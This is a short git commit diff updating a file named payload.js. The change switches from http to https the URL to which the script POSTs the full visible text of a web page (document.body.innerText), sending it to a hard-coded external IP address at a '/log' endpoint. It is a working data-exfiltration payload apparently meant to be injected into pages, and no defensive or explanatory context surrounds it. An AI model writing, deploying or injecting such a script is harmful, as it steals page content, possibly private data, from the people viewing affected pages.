5f4737d26bae9bffcda80202e551181402dc22c1
N7C3TRY <45738080+N7C3TRY@users.noreply.github.com>
2025-04-06 22:35:43 -0500

    Update payload.js
    https

--- payload.js
+++ payload.js
@@ -2,7 +2,7 @@
 let data = document.body.innerText;
 
 // Send this data to your server via a POST request
-fetch("http://185.196.11.208:8000/log", {
+fetch("https://185.196.11.208:8000/log", {
   method: "POST",
   body: "content=" + encodeURIComponent(data),  // Encodes the data to be safely sent over HTTP
   headers: { "Content-Type": "application/x-www-form-urlencoded" }
